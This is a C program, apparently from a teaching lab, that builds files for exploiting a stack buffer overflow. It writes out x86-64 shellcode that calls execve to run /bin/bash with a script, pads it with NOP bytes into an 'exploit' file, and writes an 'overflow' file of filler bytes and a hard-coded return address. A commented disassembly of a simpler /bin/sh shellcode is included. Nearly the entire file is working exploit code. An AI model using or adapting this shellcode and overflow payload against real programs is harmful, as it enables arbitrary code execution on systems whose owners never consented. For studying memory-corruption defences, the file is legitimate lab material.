//
// buildExploit.c
//
// - a program to create files to exploit overflow vulnerability
//
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char exploit_code[] =
    "\x55"                          /* push   %rbp */
    "\x48\x89\xe5"                  /* mov    %rsp,%rbp */
    "\x48\xc7\xc2\x00\x00\x00\x00"  /* mov    $0x0,%rdx */
    "\x48\xc7\xc7\x00\x00\x00\x00"  /* mov    $0x0,%rdi */
    "\x57"
    "\x48\xbf\x73\x6e\x6f\x77\x2e"
    "\x73\x68\x00"  /* snow.sh */
    "\x57"                          /* push   %rdi */
    "\x48\xbf\x62\x61\x73\x68\x00" /* bash */
    "\x00\x00\x00"
    "\x57"
    "\x48\xbf\x68\x00\x00\x00\x00" /* h */
    "\x00\x00\x00"
    "\x57"
    "\x48\xbf\x2f\x62\x69\x6e\x2f" /* bin/bas */
    "\x62\x61\x73"
    "\x57"
    "\x48\xc7\xc7\x00\x00\x00\x00"
    "\x57"
    "\x48\x8d\x7c\x24\x20"
    "\x57"
    "\x48\x8d\x7c\x24\x20"
    "\x57"
    "\x48\x8d\x7c\x24\x18"
    "\x57"
    "\x48\x8b\x7c\x24\x00"
    "\x48\x8d\x74\x24\x08"
    "\x48\xc7\xc0\x3b\x00\x00\x00"
    "\x0f\x05"
    "\xb8\x00\x00\x00\x00"
    "\x5d"
    "\xc3"
    "\x66\x0f\x1f\x84\x00\x00\x00"
    "\x00\x00"

/*
 5fa:   55                      push   %rbp
 5fb:   48 89 e5                mov    %rsp,%rbp
 5fe:   48 c7 c2 00 00 00 00    mov    $0x0,%rdx
 605:   48 c7 c6 00 00 00 00    mov    $0x0,%rsi
 60c:   48 bf 2f 62 69 6e 2f    movabs $0x68732f6e69622f,%rdi
 613:   73 68 00
 616:   57                      push   %rdi
 617:   48 89 e7                mov    %rsp,%rdi
 61a:   48 c7 c0 3b 00 00 00    mov    $0x3b,%rax
 621:   0f 05                   syscall
 623:   b8 00 00 00 00          mov    $0x0,%eax
 628:   5d                      pop    %rbp
 629:   c3                      retq
 62a:   66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
*/
;

FILE *fp;

int main(int argc, char **argv)
{
    char buffer[1024];
    char overflow[]= "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE"
                      "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE"
                      "\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE"
                       "\x00\xB0\x34\x12\x00\x00\x00\x00";
    int i, n;
    int offset;
    char nop = 0x90;

    /* Initialize buffer with 0x90 (NOP = no-op instruction) */
    memset(buffer, 0x90, 1024);

    /* Copy exploit code to the buffer to be output to exploit */
    n = sizeof(exploit_code);
    offset = 0;
    for (i=0; i<n; i++)
      buffer[i+offset] = exploit_code[i];

    /* Save the object code to the file "exploit" */
    fp = fopen("./exploit", "wb");
    fwrite(buffer, 1024, 1, fp);
    fclose(fp);

    /* Save the overflow data to the file "overflow" */
    fp = fopen("./overflow", "wb");
    fwrite(overflow, sizeof(overflow), 1, fp);
    fclose(fp);

    return 0;
}

